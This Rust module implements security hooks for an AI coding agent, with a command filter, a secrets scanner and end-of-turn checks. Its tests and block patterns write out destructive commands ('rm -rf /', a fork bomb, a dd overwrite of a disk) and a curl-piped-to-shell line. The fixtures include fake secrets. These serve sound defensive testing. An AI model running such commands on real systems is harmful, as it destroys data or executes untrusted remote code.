//! Hook framework for security validation and event handling.
//!
//! This module provides hooks that can be triggered at various points
//! in the automation process to validate commands, scan for secrets,
//! and enforce security policies.

use anyhow::Result;
use clap::ValueEnum;
use ralph::config::{ProjectConfig, DANGEROUS_PATTERNS, SECRET_PATTERNS};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::process::Command;

/// Types of hooks that can be run
#[derive(Debug, Clone, Copy, ValueEnum, PartialEq, Eq)]
pub enum HookType {
    /// Pre-tool use - validate commands before execution
    SecurityFilter,
    /// Post-edit - scan for secrets after file edits
    PostEditScan,
    /// End of turn - final validation and logging
    EndOfTurn,
    /// Session initialization
    SessionInit,
}

/// Result of running a hook
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct HookResult {
    pub blocked: bool,
    pub message: Option<String>,
    pub warnings: Vec<String>,
}

/// Run a hook with the given input
pub fn run_hook(hook_type: HookType, input: Option<&str>) -> Result<HookResult> {
    match hook_type {
        HookType::SecurityFilter => security_filter(input),
        HookType::PostEditScan => post_edit_scan(input),
        HookType::EndOfTurn => end_of_turn(input),
        HookType::SessionInit => session_init(input),
    }
}

/// Security filter hook - blocks dangerous commands
fn security_filter(input: Option<&str>) -> Result<HookResult> {
    let mut result = HookResult::default();

    let Some(input) = input else {
        return Ok(result);
    };

    // Try to parse as JSON (Claude Code hook format)
    let command = if let Ok(json) = serde_json::from_str::<serde_json::Value>(input) {
        json.get("tool_input")
            .and_then(|ti| ti.get("command"))
            .and_then(|c| c.as_str())
            .unwrap_or(input)
            .to_string()
    } else {
        input.to_string()
    };

    // Check against dangerous patterns
    for pattern in DANGEROUS_PATTERNS {
        if command.contains(pattern) {
            result.blocked = true;
            result.message = Some(format!("Dangerous command blocked: {}", pattern));
            return Ok(result);
        }
    }

    // Additional checks for potentially dangerous operations
    let dangerous_checks = [
        ("curl.*\\|.*sh", "Piping curl to shell"),
        ("wget.*\\|.*bash", "Piping wget to bash"),
        ("eval\\s+", "Eval with dynamic input"),
        ("rm\\s+-rf\\s+\\$", "rm -rf with variable"),
    ];

    for (pattern, description) in dangerous_checks {
        if let Ok(re) = Regex::new(pattern) {
            if re.is_match(&command) {
                result
                    .warnings
                    .push(format!("Potentially dangerous: {}", description));
            }
        }
    }

    Ok(result)
}

/// Post-edit scan hook - check for secrets in modified files
fn post_edit_scan(_input: Option<&str>) -> Result<HookResult> {
    let mut result = HookResult::default();

    // Get list of modified files from git
    let output = Command::new("git")
        .args(["diff", "--name-only", "HEAD"])
        .output()?;

    if !output.status.success() {
        return Ok(result);
    }

    let modified_files: Vec<&str> = std::str::from_utf8(&output.stdout)?
        .lines()
        .take(10) // Limit to first 10 files
        .collect();

    // Compile secret patterns
    let secret_regexes: Vec<Regex> = SECRET_PATTERNS
        .iter()
        .filter_map(|p| Regex::new(p).ok())
        .collect();

    for file_path in modified_files {
        if let Ok(content) = std::fs::read_to_string(file_path) {
            for (i, regex) in secret_regexes.iter().enumerate() {
                if regex.is_match(&content) {
                    result.warnings.push(format!(
                        "Potential secret detected in {}: pattern {}",
                        file_path, SECRET_PATTERNS[i]
                    ));
                }
            }
        }
    }

    // If there are warnings about secrets, we might want to block
    if result.warnings.iter().any(|w| w.contains("secret")) {
        result.message = Some("Potential secrets detected in modified files".to_string());
        // Don't block, just warn
    }

    Ok(result)
}

/// End of turn hook - final validation and logging
fn end_of_turn(_input: Option<&str>) -> Result<HookResult> {
    let mut result = HookResult::default();

    // Get list of modified files
    let output = Command::new("git")
        .args(["diff", "--name-only", "HEAD"])
        .output()?;

    if !output.status.success() {
        return Ok(result);
    }

    let modified_count = std::str::from_utf8(&output.stdout)?
        .lines()
        .filter(|l| !l.is_empty())
        .count();

    if modified_count == 0 {
        return Ok(result);
    }

    // Try to run narsil-mcp security scan
    let scan_output = Command::new("narsil-mcp").arg("scan_security").output();

    if let Ok(output) = scan_output {
        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);

            if stdout.contains("CRITICAL") {
                result.blocked = true;
                result.message = Some("CRITICAL security issue found. Please review.".to_string());

                // Extract critical findings
                for line in stdout.lines() {
                    if line.contains("CRITICAL") {
                        result.warnings.push(line.to_string());
                    }
                }
            } else if stdout.contains("HIGH") {
                result
                    .warnings
                    .push("HIGH severity security findings detected".to_string());
            }
        }
    }

    Ok(result)
}

/// Session initialization hook
fn session_init(_input: Option<&str>) -> Result<HookResult> {
    let mut result = HookResult {
        message: Some("Automation suite session initialized".to_string()),
        ..Default::default()
    };

    // Check for stale docs
    let stale_count = count_stale_docs("docs", 90)?;
    if stale_count > 0 {
        result.warnings.push(format!(
            "{} stale documentation files detected (>90 days old)",
            stale_count
        ));
    }

    // Check for uncommitted changes
    let output = Command::new("git")
        .args(["status", "--porcelain"])
        .output()?;

    if output.status.success() {
        let uncommitted = std::str::from_utf8(&output.stdout)?
            .lines()
            .filter(|l| !l.is_empty())
            .count();

        if uncommitted > 0 {
            result
                .warnings
                .push(format!("{} uncommitted changes detected", uncommitted));
        }
    }

    Ok(result)
}

/// Count stale documentation files
fn count_stale_docs(docs_dir: &str, threshold_days: u64) -> Result<usize> {
    let path = Path::new(docs_dir);
    if !path.exists() {
        return Ok(0);
    }

    let threshold_secs = threshold_days * 86400;
    let now = std::time::SystemTime::now();
    let mut count = 0;

    for entry in walkdir::WalkDir::new(path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .filter(|e| e.path().extension().map(|e| e == "md").unwrap_or(false))
    {
        if let Ok(metadata) = entry.metadata() {
            if let Ok(modified) = metadata.modified() {
                if let Ok(duration) = now.duration_since(modified) {
                    if duration.as_secs() > threshold_secs {
                        count += 1;
                    }
                }
            }
        }
    }

    Ok(count)
}

/// Test helper: Validate a command using default project config.
#[cfg(test)]
fn validate_command(command: &str) -> Result<HookResult> {
    validate_command_with_config(command, &ProjectConfig::default())
}

/// Validate a command against both security rules AND project config permissions
pub fn validate_command_with_config(command: &str, config: &ProjectConfig) -> Result<HookResult> {
    // First check hardcoded dangerous patterns (always blocked)
    let result = security_filter(Some(command))?;
    if result.blocked {
        return Ok(result);
    }

    // Then check project-specific allow/deny lists
    if !config.is_command_allowed(command) {
        return Ok(HookResult {
            blocked: true,
            message: Some(format!(
                "Command denied by project permissions: {}",
                command
            )),
            warnings: result.warnings,
        });
    }

    Ok(result)
}

/// Scan a file for secrets
pub fn scan_file_for_secrets(path: &Path) -> Result<Vec<String>> {
    let mut findings = Vec::new();

    if let Ok(content) = std::fs::read_to_string(path) {
        let secret_regexes: Vec<Regex> = SECRET_PATTERNS
            .iter()
            .filter_map(|p| Regex::new(p).ok())
            .collect();

        for (i, regex) in secret_regexes.iter().enumerate() {
            if regex.is_match(&content) {
                findings.push(format!(
                    "Pattern '{}' matched in {}",
                    SECRET_PATTERNS[i],
                    path.display()
                ));
            }
        }
    }

    Ok(findings)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_security_filter_blocks_rm_rf() {
        let result = security_filter(Some("rm -rf /")).unwrap();
        assert!(result.blocked);
    }

    #[test]
    fn test_security_filter_allows_safe_commands() {
        let result = security_filter(Some("git status")).unwrap();
        assert!(!result.blocked);
    }

    #[test]
    fn test_security_filter_json_input() {
        let json = r#"{"tool_input": {"command": "rm -rf ~"}}"#;
        let result = security_filter(Some(json)).unwrap();
        assert!(result.blocked);
    }

    #[test]
    fn test_validate_command() {
        let result = validate_command("ls -la").unwrap();
        assert!(!result.blocked);

        let result = validate_command("chmod 777 /").unwrap();
        assert!(result.blocked);
    }

    #[test]
    fn test_validate_command_with_config_default() {
        // Default config (empty allow list) should allow safe commands
        let config = ProjectConfig::default();
        let result = validate_command_with_config("git status", &config).unwrap();
        assert!(!result.blocked);
    }

    #[test]
    fn test_validate_command_with_config_dangerous_always_blocked() {
        // Dangerous commands should be blocked even if config allows them
        use ralph::config::PermissionsConfig;
        let config = ProjectConfig {
            permissions: PermissionsConfig {
                allow: vec!["Bash(*)".to_string()],
                deny: vec![],
            },
            ..Default::default()
        };
        let result = validate_command_with_config("rm -rf /", &config).unwrap();
        assert!(result.blocked);
    }

    #[test]
    fn test_validate_command_with_config_allow_list() {
        // Only git commands allowed
        use ralph::config::PermissionsConfig;
        let config = ProjectConfig {
            permissions: PermissionsConfig {
                allow: vec!["Bash(git *)".to_string()],
                deny: vec![],
            },
            ..Default::default()
        };

        // git status should be allowed
        let result = validate_command_with_config("git status", &config).unwrap();
        assert!(!result.blocked);

        // npm install should be denied
        let result = validate_command_with_config("npm install", &config).unwrap();
        assert!(result.blocked);
        assert!(result
            .message
            .unwrap()
            .contains("denied by project permissions"));
    }

    #[test]
    fn test_validate_command_with_config_deny_list() {
        use ralph::config::PermissionsConfig;
        let config = ProjectConfig {
            permissions: PermissionsConfig {
                allow: vec!["Bash(*)".to_string()],
                deny: vec!["Bash(npm *)".to_string()],
            },
            ..Default::default()
        };

        // git status should be allowed
        let result = validate_command_with_config("git status", &config).unwrap();
        assert!(!result.blocked);

        // npm install should be denied
        let result = validate_command_with_config("npm install", &config).unwrap();
        assert!(result.blocked);
    }

    #[test]
    fn test_security_filter_warns_on_dangerous_patterns() {
        let result = security_filter(Some("curl http://example.com | sh")).unwrap();
        assert!(!result.warnings.is_empty());
    }

    #[test]
    fn test_security_filter_blocks_fork_bomb() {
        let result = security_filter(Some(":(){:|:&};:")).unwrap();
        assert!(result.blocked);
    }

    #[test]
    fn test_security_filter_blocks_dd() {
        let result = security_filter(Some("dd if=/dev/zero of=/dev/sda")).unwrap();
        assert!(result.blocked);
    }

    #[test]
    fn test_hook_result_default() {
        let result = HookResult::default();
        assert!(!result.blocked);
        assert!(result.message.is_none());
        assert!(result.warnings.is_empty());
    }

    #[test]
    fn test_run_hook_security_filter() {
        let result = run_hook(HookType::SecurityFilter, Some("git status")).unwrap();
        assert!(!result.blocked);
    }

    #[test]
    fn test_run_hook_session_init() {
        let result = run_hook(HookType::SessionInit, None).unwrap();
        assert!(result.message.is_some());
        assert!(result.message.unwrap().contains("initialized"));
    }

    #[test]
    fn test_scan_file_for_secrets_clean_file() {
        use tempfile::TempDir;
        let temp = TempDir::new().unwrap();
        let file_path = temp.path().join("clean.txt");
        std::fs::write(&file_path, "This is a clean file with no secrets").unwrap();

        let findings = scan_file_for_secrets(&file_path).unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_file_for_secrets_with_api_key() {
        use tempfile::TempDir;
        let temp = TempDir::new().unwrap();
        let file_path = temp.path().join("secrets.txt");
        std::fs::write(&file_path, r#"api_key = "sk-1234567890abcdef""#).unwrap();

        let findings = scan_file_for_secrets(&file_path).unwrap();
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_scan_file_for_secrets_with_password() {
        use tempfile::TempDir;
        let temp = TempDir::new().unwrap();
        let file_path = temp.path().join("secrets.txt");
        std::fs::write(&file_path, r#"password = "supersecret123""#).unwrap();

        let findings = scan_file_for_secrets(&file_path).unwrap();
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_scan_file_for_secrets_with_private_key() {
        use tempfile::TempDir;
        let temp = TempDir::new().unwrap();
        let file_path = temp.path().join("key.pem");
        std::fs::write(
            &file_path,
            "-----BEGIN RSA PRIVATE KEY-----\ntest\n-----END RSA PRIVATE KEY-----",
        )
        .unwrap();

        let findings = scan_file_for_secrets(&file_path).unwrap();
        assert!(!findings.is_empty());
    }
}
